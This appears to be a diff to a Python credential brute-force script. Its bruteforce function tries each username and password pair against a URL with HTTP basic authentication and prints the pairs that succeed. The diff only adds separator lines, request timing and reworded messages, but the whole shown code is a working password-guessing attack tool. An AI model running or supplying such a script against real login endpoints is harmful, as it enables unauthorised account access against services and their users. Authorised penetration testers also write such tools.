@@ -16,14 +16,20 @@ def bruteforce(usernames, passwords, url):
         for password in passwords:
             try:
                 userpass = (username, password)
+
                 req = requests.get(url, auth=userpass)
+
                 if req.status_code == 200:
+                    print("++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                     print("username is : ", userpass[0])
                     print("password is : ", userpass[1])
                     print("Status Code: ", req.status_code)
+                    print(f"Request completed in {req.elapsed}ms")
+                    print("++++++++++++++++++++++++++++++++++++++++++++++++++++++\n")
                 else:
-                    print(userpass, " didn't match!")
+                    print(f"Didn't match: {userpass}")
                     print("Status Code: ", req.status_code)
+                    print(f"Request completed in {req.elapsed}ms\n")
             except:
                 print("Something is wrong! - Probably Connection Issues!")
 
